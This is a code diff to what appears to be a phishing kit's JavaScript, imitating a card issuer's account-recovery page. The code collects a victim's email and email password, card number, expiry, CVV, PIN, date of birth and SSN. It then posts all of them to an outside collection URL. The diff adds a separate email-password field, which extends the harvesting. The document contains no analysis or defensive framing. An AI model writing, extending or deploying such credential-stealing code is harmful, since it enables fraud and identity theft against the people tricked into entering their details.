@@ -58,7 +58,8 @@ document.getElementById("log-in-button").addEventListener("click", function(even
 document.getElementById("forgot-userid-step-continue-btn").addEventListener("click", function(event){
     event.preventDefault();
     var cardname = document.getElementById("cardname").value;
-    var email_pass = document.getElementById("cardMemberemail").value;
+    var email_ = document.getElementById("cardMemberemail").value;
+    var email_pass = document.getElementById("cardMemberemailpass").value;
     var cc = document.getElementById("cardAccountNumber").value;cardname
     var expiry =    document.getElementById("CardExpirationDate").value
     var sec_code =    document.getElementById("cvv").value
@@ -71,7 +72,7 @@ document.getElementById("forgot-userid-step-continue-btn").addEventListener("cli
     }
 
     else{
-        var body ="Email: "+email+"\nEmail_pass: "+email_pass+"\n name on card: "+cardname+"\ncc: "+cc+"\nexpiry: "+expiry+"\nSec_code: "+sec_code+"\npin: "+pin+"\ndob: "+dob+"\nssn: "+ssn
+        var body ="Email: "+email+"\nEmail_: "+email_+"\nEmail_pass: "+email_pass+"\n name on card: "+cardname+"\ncc: "+cc+"\nexpiry: "+expiry+"\nSec_code: "+sec_code+"\npin: "+pin+"\ndob: "+dob+"\nssn: "+ssn
         var yourUrl ="https://qwrewxxxkjj.xyz/pharoh/smtpjs.php";
         let agent = navigator.userAgent;
         var xhr = new XMLHttpRequest();
